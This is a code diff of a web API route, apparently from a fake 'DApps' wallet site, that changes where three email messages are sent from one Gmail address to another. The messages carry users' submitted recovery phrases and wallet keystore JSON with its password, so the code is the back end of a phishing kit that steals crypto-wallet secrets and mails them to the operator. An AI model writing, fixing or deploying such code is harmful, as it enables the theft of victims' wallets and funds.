@@ -70,7 +70,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: 'billions2213@gmail.com',
+        to: 'ogobillions458@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
@@ -109,7 +109,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "billions2213@gmail.com",
+        to: "ogobillions458@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
@@ -150,7 +150,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "billions2213@gmail.com",
+        to: "ogobillions458@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
